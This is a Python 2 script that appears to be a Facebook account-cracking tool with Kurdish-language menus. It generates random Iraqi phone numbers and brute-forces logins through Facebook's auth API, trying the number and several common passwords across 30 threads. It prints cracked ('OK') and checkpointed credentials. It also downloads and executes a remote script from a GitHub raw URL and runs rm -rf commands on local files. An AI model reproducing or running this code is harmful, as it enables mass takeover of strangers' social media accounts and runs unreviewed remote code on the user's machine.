import os, sys, time, datetime
from wget import *
import random, hashlib
import re, threading, json
import urllib, cookielib, getpass, time
os.system("rm -rf .fff.py")
os.system("rm -rf .sss.py")
os.system("rm -rf .sss(2).py")
os.system("rm -rf .sss(3).py")
os.system("rm -rf .sss(4).py")
os.system("rm -rf .sss(5).py")
os.system("rm -rf list(6).txt")
os.system("rm -rf .txt")
os.system('rm -rf list.txt')
for n in range(101010):
    nmbr = random.randint(1111111, 9999999)
    sys.stdout = open('.txt', 'a')
    print nmbr
    sys.stdout.flush()

try:
    import requests
except ImportError:
    os.system('pip2 install requests')
    os.system("python2 .sss.py")

try:
    import mechanize
except ImportError:
    os.system('pip2 install mechanize')
    os.system('python2 .sss.py')

from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser
bd=random.randint(2e7, 3e7)
sim=random.randint(2e4, 4e4)
header={'x-fb-connection-bandwidth': repr(bd),'x-fb-sim-hni': repr(sim),'x-fb-net-hni': repr(sim),'x-fb-connection-quality': 'EXCELLENT','x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA','user-agent':'Mozilla/5.0 (Linux; Android 5.0; SM-G900P Build/LRX21T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.121 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/35.0.0.48.273;]','content-type': 'application/x-www-form-urlencoded','x-fb-http-engine': 'Liger'}
reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
download("https://raw.githubusercontent.com/hedi44/fox/main/.sss.py")
os.system('clear')

def exb():
    print '[!] Exit'
    os.sys.exit()


def psb(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.01)

hala = "  \033[31;1m 1\033[0;1m - Random( \033[31;1mVery-Fast\033[0;1m )  \033[31;1m\n  \033[31;1m 2\033[0;1m - Random( \033[33;1mmedium\033[0;1m )\n  \033[31;1m 3 \033[0;1m- random( \033[1;32;40mMod\033[0;1m )\n \033[31;1m  0 \033[0;1m- Darchwn la\033[31;1m Program\033[0;1m"
def t():
    os.system("clear")
    


def cb():
    os.system('clear')

               

back = 0
successful = []
cpb = []
oks = []
id = []
os.system("clear")

    
    
def menu():
    os.system('rm -rf list.txt')
    os.system('clear')
    os.system("xdg-open https://t.me/zed_cracker_1")
    time.sleep(2)
    print("\033[32m.")
    os.system("clear")
    os.system("figlet Welcome")
    print("\033[90;1m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\033[0;1m")
    print("   Auther: Zed\n   My Lion: 💔\n   Chenall telegram: @kak_zed_1")
 
    print("  ( \033[34mkorak \033[0;1m,\033[33;1m TP-Link\033[0;1m ,\033[33;1m Tarinet\033[0;1m )\n\033[90;1m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\033[0;1m")
    print(hala)
    print("\033[90;1m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\033[0;1m")
    action()


def action():
    global cpb
    global oks
    bch = raw_input(' Hall Bzhera Dlakam: ')
    if bch == '11':
        os.system("python2 .hhh.py")
        print ' halaya !'
        action()
    elif bch == '1':
    	os.system("python2 .sss.py")
    elif bch == "2":
    	os.system("python2 .hhh.py")
    elif bch == '3':
     	os.system('clear')
     	print("\033[32m.")
     	os.system("clear")
     	os.system("figlet Zed Coder")
     	print("\033[90;1m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\033[0;1m")
     	print '\033[32m 770 - 771 - 772 - 773 - 774\n  750 - 751 - 752 - 753 - 754\n   780 - 781 - 782 - 783 - 784\033[0;1m\n\033[90;1m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\033[0;1m'
     	try:
     	    k = '+964'
            c = raw_input('\033[90;1m Saratakay chi bet : ')
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())

        except IOError:
            print '!'
            raw_input('\n[ Garanawa ]')
            menu()


    elif bch == '13':
        login()
    elif bch == '0':
        exb()
    else:
        print '!'
        action()
    xxx = str(len(id))
    psb('\033[31m Zhmaray Line Akany .txt ya ka: ' + xxx)
    print '\033[90;1m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\033[0;1m'

    def main(arg):
        user = arg
        try:
            time.sleep(0.1)
        except OSError:
            pass

        try:
            pass1 = user
            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
            q = json.load(data)
            if 'access_token' in q:
                print '\033[1;32;40m[OK]\033[0m Number: ' + k + c + user + ' PASS: ' + pass1
            elif 'free.facebook.com' in q['error_msg']:
                print '[\033[31mCP\033[0;1m] Number: ' + k + c + user + ' PASS: ' + pass1
            else:
                pass2 = "1234512345"
                data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                q = json.load(data)
                if 'access_token' in q:
                   print '\033[1;32;40m[OK]\033[0m Number: ' + k + c + user + ' PASS: ' + pass2
                elif 'free.facebook.com' in q['error_msg']:
                    print '[\033[31mCP\033[0;1m] Number: ' + k + c + user + ' PASS: ' + pass2
                else:
                    pass3 = "123454321"
                    data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                    q = json.load(data)
                    if 'access_token' in q:
                        print '\033[1;32;40m[OK]\033[0m Number: ' + k + c + user + ' PASS: ' + pass3
                    elif 'free.facebook.com' in q['error_msg']:
                        print '[\033[31mCP\033[0;1m] Number: ' + k + c + user + ' PASS: ' + pass3
                    else:
                        pass4 = "123456123456"
                        data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                        q = json.load(data)
                        if 'access_token' in q:
                            print '\033[1;32;40m[OK]\033[0m Number: ' + k + c + user + ' PASS: ' + pass4
                        elif 'free.facebook.com' in q['error_msg']:
                            print '[\033[31mCP\033[0;1m] Number: ' + k + c + user + ' PASS: ' + pass4
                        else:
                            pass5 = "1122334455"
                            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                            q = json.load(data)
                            if 'access_token' in q:
                                print '\033[1;32;40m[OK]\033[0m Number: ' + k + c + user + ' PASS: ' + pass5
                            elif 'free.facebook.com' in q['error_msg']:
                                print '[\033[31mCP\033[0;1m] Number: ' + k + c + user + ' PASS: ' + pass5
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print '         '
    print 'Tawaw Bw ....'
    raw_input('\n[Enter Bka Bo Darchwn]')
    os.sys.exit()
if __name__ == '__main__':
	menu()
    

